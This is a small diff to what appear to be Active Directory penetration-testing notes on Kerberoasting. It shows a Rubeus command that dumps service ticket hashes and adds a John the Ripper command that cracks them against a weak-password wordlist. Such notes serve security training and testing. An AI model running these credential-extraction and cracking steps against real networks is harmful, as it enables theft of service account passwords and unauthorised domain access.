@@ -74,5 +74,8 @@ Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
 **_Cracking Hashes :_**
 
 
+- Crack ticket using John the Ripper
 
 
+john.exe --wordlist=C:\AD\Tools\kerberoast\10k-
+worst-pass.txt C:\AD\Tools\hashes.txt
